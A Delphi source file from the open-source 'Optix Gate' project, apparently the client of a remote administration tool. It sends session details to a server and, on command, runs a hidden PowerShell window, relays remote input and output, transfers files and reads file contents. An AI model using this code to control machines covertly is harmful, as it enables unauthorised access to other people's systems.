{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                             Project: Optix Gate                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://bsky.app/profile/darkcodersc.bsky.social           }
{                   https://github.com/darkcodersc                             }
{                   License: GPL v3                                            }
{                                                                              }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{******************************************************************************}

unit Optix.Protocol.SessionHandler;

interface

// ---------------------------------------------------------------------------------------------------------------------
uses
  System.Classes,

  Generics.Collections,

  XSuperObject,

  Optix.Protocol.Client.Handler, Optix.Protocol.Packet, Optix.Protocol.Preflight, Optix.Protocol.Worker.FileTransfer,
  Optix.Func.Commands, Optix.Func.Commands.Base, Optix.Actions.ProcessHandler, Optix.Func.Commands.FileSystem,
  Optix.Func.Commands.Shell, Optix.FileSystem.Helper, Optix.Func.Commands.ContentReader;
// ---------------------------------------------------------------------------------------------------------------------

type
  TShellAction = (
    saBreak,
    saTerminate
  );

  {$IFDEF CLIENT_GUI}
  TOptixSessionHandlerThread = class;

  TOnSessionHandlerEvent = procedure(Sender : TOptixSessionHandlerThread) of object;

  TOnConnectedToServer         = TOnSessionHandlerEvent;
  TOnDisconnectedFromServer    = TOnSessionHandlerEvent;
  TOnSessionHandlerDestroyed   = TOnSessionHandlerEvent;
  {$ENDIF}

  TOptixSessionHandlerThread = class(TOptixClientHandlerThread)
  private
    FTasks                    : TObjectList<TOptixTask>;
    FShellInstances           : TObjectList<TProcessHandler>;
    FFileTransferOrchestrator : TOptixFileTransferOrchestratorThread;
    FContentReaders           : TObjectDictionary<TGUID, TContentReader>;

    {$IFDEF CLIENT_GUI}
    FOnConnectedToServer         : TOnConnectedToServer;
    FOnDisconnectedFromServer    : TOnDisconnectedFromServer;
    FOnSessionHandlerDestroyed   : TOnSessionHandlerDestroyed;
    {$ENDIF}

    {@M}
    procedure InitializeFileTransferOrchestratorThread();
  protected
    {@M}
    function InitializePreflightRequest() : TOptixPreflightRequest; override;
    procedure Initialize(); override;
    procedure Finalize(); override;

    procedure PollShellInstances();
    procedure PollActions(); override;
    procedure PollTasks();

    procedure RegisterNewFileTransfer(const ATransfer : TOptixCommandTransfer);
    procedure RegisterAndStartNewTask(const AOptixTask : TOptixTask);

    procedure RegisterAndStartNewShellInstance(const ACommand : TOptixStartShellInstance);
    procedure PerformActionOnShellInstance(const AInstanceId : TGUID; const AShellAction : TShellAction);
    procedure TerminateShellInstance(const ACommand : TOptixTerminateShellInstance);
    procedure BreakShellInstance(const ACommand : TOptixBreakShellInstance);
    procedure StdinToShellInstance(const ACommand : TOptixStdinShellInstance);

    procedure BrowseContentReaderPage(const AReaderId : TGUID; const APageNumber : Int64;
      const ANewPageSize : UInt64 = 0; const AFirstPage : Boolean = False);
    procedure CreateAndRegisterNewContentReader(const ACommand : TOptixCommandCreateFileContentReader);

    procedure Connected(); override;
    procedure Disconnected(); override;
    procedure PacketReceived(const ASerializedPacket : ISuperObject); override;
  {$IFDEF CLIENT_GUI}
  public
    property OnConnectedToServer       : TOnConnectedToServer         write FOnConnectedToServer;
    property OnDisconnectedFromServer  : TOnDisconnectedFromServer    write FOnDisconnectedFromServer;
    property OnSessionHandlerDestroyed : TOnSessionHandlerDestroyed   write FOnSessionHandlerDestroyed;
    {$ENDIF}
  end;

implementation

// ---------------------------------------------------------------------------------------------------------------------
uses
  System.SysUtils, System.StrUtils, System.Rtti,

  Winapi.Windows,

  Optix.Func.SessionInformation, Optix.Func.LogNotifier, Optix.Thread, Optix.ClassesRegistry;
// ---------------------------------------------------------------------------------------------------------------------

{ TOptixSessionHandlerThread.Initialize }
procedure TOptixSessionHandlerThread.Initialize();
begin
  inherited;
  ///

  FFileTransferOrchestrator := nil;
  FTasks := TObjectList<TOptixTask>.Create(True);
  FShellInstances := TObjectList<TProcessHandler>.Create(True);
  FContentReaders := TObjectDictionary<TGUID, TContentReader>.Create([doOwnsValues]);

  {$IFDEF CLIENT_GUI}
  FOnConnectedToServer         := nil;
  FOnDisconnectedFromServer    := nil;
  FOnSessionHandlerDestroyed := nil;
  {$ENDIF}
end;

{ TOptixSessionHandlerThread.Finalize }
procedure TOptixSessionHandlerThread.Finalize();
begin
  inherited;
  ///

  {$IFDEF CLIENT_GUI}
  if Assigned(FOnSessionHandlerDestroyed) then
    Synchronize(procedure begin
      FOnSessionHandlerDestroyed(self);
    end);
  {$ENDIF}

  if Assigned(FTasks) then
    FreeAndNil(FTasks);

  if Assigned(FShellInstances) then
    FreeAndNil(FShellInstances);

  if Assigned(FContentReaders) then
    FreeAndNil(FContentReaders);
end;

{ TOptixSessionHandlerThread.InitializePreflightRequest }
function TOptixSessionHandlerThread.InitializePreflightRequest() : TOptixPreflightRequest;
begin
  result.ClientKind := ckHandler;
end;

{ TOptixSessionHandlerThread.PollTasks }
procedure TOptixSessionHandlerThread.PollTasks();
begin
  if not Assigned(FTasks) or (FTasks.Count = 0) then
    Exit();
  ///

  var ATasksToDelete := TList<TOptixTask>.Create();
  try
    for var ATask in FTasks do begin
      if ATask.Completed then begin
        AddPacket(TOptixTaskCallback.Create(ATask));

        ///
        ATasksToDelete.Add(ATask);
      end else if not ATask.RunningAware and ATask.Running then begin
        ATask.RunningAware := True;

        ///
        AddPacket(TOptixTaskCallback.Create(ATask));
      end;
    end;

    for var ATask in ATasksToDelete do
      FTasks.Remove(ATask);
  finally
    FreeAndNil(ATasksToDelete);
  end;
end;

{ TOptixSessionHandlerThread.RegisterAndStartNewTask }
procedure TOptixSessionHandlerThread.RegisterAndStartNewTask(const AOptixTask : TOptixTask);
begin
  if not Assigned(AOptixTask) or not Assigned(FTasks) then
    Exit();
  ///

  var ATaskId := TGUID.NewGuid();

  AOptixTask.SetTaskId(ATaskId);

  AddPacket(TOptixTaskCallback.Create(AOptixTask));

  AOptixTask.Start();

  ///
  FTasks.Add(AOptixTask);
end;

{ TOptixSessionHandlerThread.PollShellInstances }
procedure TOptixSessionHandlerThread.PollShellInstances();
begin
  var AShellInstancesToDelete := TList<TProcessHandler>.Create();
  try
    for var AShellInstance in FShellInstances do begin
      if not AShellInstance.Active then begin
        AShellInstancesToDelete.Add(AShellInstance);

        ///
        continue;
      end;

      try
        var ARetrievedOutput := AShellInstance.ReadAvailableOutput();
        ///

        if not String.IsNullOrWhiteSpace(ARetrievedOutput) then
          AddPacket(TOptixShellOutput.Create(AShellInstance.GroupId, ARetrievedOutput, AShellInstance.InstanceId));
      except
        AShellInstance.Close();
      end;
    end;

    for var AShellInstance in AShellInstancesToDelete do begin
      // Notify server about a terminated shell instance
      var ATerminateShellInstance := TOptixTerminateShellInstance.Create(AShellInstance.InstanceId);
      ATerminateShellInstance.WindowGUID := AShellInstance.GroupId;
      AddPacket(ATerminateShellInstance);

      ///
      FShellInstances.Remove(AShellInstance);
    end;
  finally
    FreeAndNil(AShellInstancesToDelete);
  end;
end;

{ TOptixSessionHandlerThread.PerformActionOnShellInstance }
procedure TOptixSessionHandlerThread.PerformActionOnShellInstance(const AInstanceId : TGUID; const AShellAction : TShellAction);
begin
  for var AShellInstance in FShellInstances do begin
    if AShellInstance.InstanceId <> AInstanceId then
      continue;
    ///

    case AShellAction of
      saBreak : begin
        if AShellInstance.Active then
          AShellInstance.TryCtrlC;
      end;

      saTerminate :
        AShellInstance.TryClose();
    end;
  end;
end;

{ TOptixSessionHandlerThread.StdinToShellInstance }
procedure TOptixSessionHandlerThread.StdinToShellInstance(const ACommand : TOptixStdinShellInstance);
begin
  for var AShellInstance in FShellInstances do begin
    if AShellInstance.InstanceId <> ACommand.InstanceId then
      continue;
    try
      AShellInstance.WriteLn(AnsiString(ACommand.CommandLine));
    except
      AShellInstance.Close();
    end;
  end;
end;

{ TOptixSessionHandlerThread.TerminateShellInstance }
procedure TOptixSessionHandlerThread.TerminateShellInstance(const ACommand : TOptixTerminateShellInstance);
begin
  PerformActionOnShellInstance(ACommand.InstanceId, saTerminate);
end;

{ TOptixSessionHandlerThread.BreakhellInstance }
procedure TOptixSessionHandlerThread.BreakShellInstance(const ACommand : TOptixBreakShellInstance);
begin
  PerformActionOnShellInstance(ACommand.InstanceId, saBreak);
end;

{ TOptixSessionHandlerThread.RegisterAndStartNewShellInstance }
procedure TOptixSessionHandlerThread.RegisterAndStartNewShellInstance(const ACommand : TOptixStartShellInstance);
begin
  var AProcessHandler := TProcessHandler.Create('powershell.exe', ACommand.WindowGUID);

  AProcessHandler.ShowWindow := False;
  AProcessHandler.Start(True);

  ///
  FShellInstances.Add(AProcessHandler);
end;

{ TOptixSessionHandlerThread.PollActions }
procedure TOptixSessionHandlerThread.PollActions();
begin
  // Tasks -------------------------------------------------------------------------------------------------------------
  PollTasks();
  // Shell Instances ---------------------------------------------------------------------------------------------------
  PollShellInstances();
  // -------------------------------------------------------------------------------------------------------------------
end;

{ TOptixSessionHandlerThread.InitializeFileTransferOrchestratorThread }
procedure TOptixSessionHandlerThread.InitializeFileTransferOrchestratorThread();
begin
  if not TOptixThread.HasRunningInstance(FFileTransferOrchestrator) then begin
    FFileTransferOrchestrator := TOptixFileTransferOrchestratorThread.Create(
      self
    );

    ///
    FFileTransferOrchestrator.Start();
  end;
end;

{ TOptixSessionHandlerThread.RegisterNewFileTransfer }
procedure TOptixSessionHandlerThread.RegisterNewFileTransfer(const ATransfer : TOptixCommandTransfer);
begin
  InitializeFileTransferOrchestratorThread();
  ///

  FFileTransferOrchestrator.AddTransfer(ATransfer);
end;

{ TOptixSessionHandlerThread.BrowseContentReaderPage }
procedure TOptixSessionHandlerThread.BrowseContentReaderPage(const AReaderId : TGUID; const APageNumber : Int64;
  const ANewPageSize : UInt64 = 0; const AFirstPage : Boolean = False);
begin
  var AReader := TContentReader(nil);
  if not FContentReaders.TryGetValue(AReaderId, AReader) then
    Exit();
  ///

  if ANewPageSize > 0 then
    AReader.PageSize := ANewPageSize;

  var ACommandClass : TOptixCommandContentReaderPageClass;

  if AFirstPage then
    ACommandClass := TOptixCommandContentReaderFirstPage
  else
    ACommandClass := TOptixCommandContentReaderPage;

  ///
  AddPacket(ACommandClass.Create(
    AReaderId,
    AReader,
    APageNumber
  ));
end;

{ TOptixSessionHandlerThread.CreateAndRegisterNewContentReader }
procedure TOptixSessionHandlerThread.CreateAndRegisterNewContentReader(
  const ACommand : TOptixCommandCreateFileContentReader);
begin
  var AReader := TContentReader.Create(ACommand.FilePath, ACommand.PageSize);

  var AReaderId := TGUID.NewGuid;

  FContentReaders.Add(AReaderId, AReader);

  BrowseContentReaderPage(AReaderId, 0, 0, True);
end;

{ TOptixSessionHandlerThread.Connected }
procedure TOptixSessionHandlerThread.Connected();
begin
  inherited;
  ///

  {$IFDEF CLIENT_GUI}
  if Assigned(FOnConnectedToServer) then
    Synchronize(procedure begin
      FOnConnectedToServer(self);
    end);
  {$ENDIF}

  var ASessionInformation := TOptixSessionInformation.Create();
  try
    ASessionInformation.DoAction();

    ///
    AddPacket(ASessionInformation);
  except
    if Assigned(ASessionInformation) then
      FreeAndNil(ASessionInformation);
  end;
end;

{ TOptixSessionHandlerThread.Disconnected }
procedure TOptixSessionHandlerThread.Disconnected();
begin
  inherited;
  ///

  {$IFDEF CLIENT_GUI}
  if Assigned(FOnDisconnectedFromServer) then
    Synchronize(procedure begin
      FOnDisconnectedFromServer(self);
    end);
  {$ENDIF}

  if TOptixThread.HasRunningInstance(FFileTransferOrchestrator) then begin
    TOptixThread.TerminateInstance(FFileTransferOrchestrator);

    ///
    FFileTransferOrchestrator := nil;
  end;
end;

{ TOptixSessionHandlerThread.PacketReceived }
procedure TOptixSessionHandlerThread.PacketReceived(const ASerializedPacket : ISuperObject);
begin
  if not Assigned(ASerializedPacket) or
     not ASerializedPacket.Contains('PacketClass') then
      Exit();
  ///

  var AClassName := ASerializedPacket.S['PacketClass'];

  var AOptixPacket  : TOptixPacket := nil;
  var AHandleMemory : Boolean := True;
  try
    try
      AOptixPacket := TOptixPacket(TClassesRegistry.CreateInstance(AClassName, [
        TValue.From<ISuperObject>(ASerializedPacket)
      ]));
      if not Assigned(AOptixPacket) then
        Exit();
      ///

      // Optix Action Command (& Response) -----------------------------------------------------------------------------
      if AOptixPacket is TOptixCommandAction then begin
        TOptixCommandActionResponse(AOptixPacket).DoAction();

        // For Action & Response
        if AOptixPacket is TOptixCommandActionResponse then begin

          ///
          AddPacket(AOptixPacket);
        end;
      // Optix Task Command --------------------------------------------------------------------------------------------
      end else if AOptixPacket is TOptixCommandTask then begin
        var ATask := TOptixCommandTask(AOptixPacket).CreateTask(TOptixCommand(AOptixPacket));

        ///
        RegisterAndStartNewTask(ATask);
      // Optix Transfers (Download & Upload) ---------------------------------------------------------------------------
      end else if AOptixPacket is TOptixCommandTransfer then
        RegisterNewFileTransfer(TOptixCommandTransfer(AOptixPacket))
      // Shell Commands ------------------------------------------------------------------------------------------------
      else if AOptixPacket is TOptixCommandShell then begin
        if AOptixPacket is TOptixStartShellInstance then
          RegisterAndStartNewShellInstance(TOptixStartShellInstance(AOptixPacket))
        else if AOptixPacket is TOptixTerminateShellInstance then
          TerminateShellInstance(TOptixTerminateShellInstance(AOptixPacket))
        else if AOptixPacket is TOptixBreakShellInstance then
          BreakShellInstance(TOptixBreakShellInstance(AOptixPacket))
        else if AOptixPacket is TOptixStdinShellInstance then
          StdinToShellInstance(TOptixStdinShellInstance(AOptixPacket));
      // Content Reader Commands ---------------------------------------------------------------------------------------
      end else if AOptixPacket is TOptixCommandCreateFileContentReader then
        CreateAndRegisterNewContentReader(TOptixCommandCreateFileContentReader(AOptixPacket))
      else if AOptixPacket is TOptixCommandCloseContentReader then
        FContentReaders.Remove(AOptixPacket.WindowGUID)
      else if AOptixPacket is TOptixCommandBrowseContentReader then
        BrowseContentReaderPage(
          AOptixPacket.WindowGUID,
          TOptixCommandBrowseContentReader(AOptixPacket).PageNumber,
          TOptixCommandBrowseContentReader(AOptixPacket).PageSize
        )
      // Simple Commands -----------------------------------------------------------------------------------------------
      else if AOptixPacket is TOptixSimpleCommand then begin
        AHandleMemory := False;
        ///

        // -------------------------------------------------------------------------------------------------------------
        if AOptixPacket is TOptixCommandTerminate then
          Terminate;
        // -------------------------------------------------------------------------------------------------------------
      end;
    except
      on E : Exception do
        AddPacket(TLogNotifier.Create(E.Message, AClassName, lkException));
    end;
  finally
    if not AHandleMemory and Assigned(AOptixPacket) then
      FreeAndNil(AOptixPacket);
  end;
end;

end.
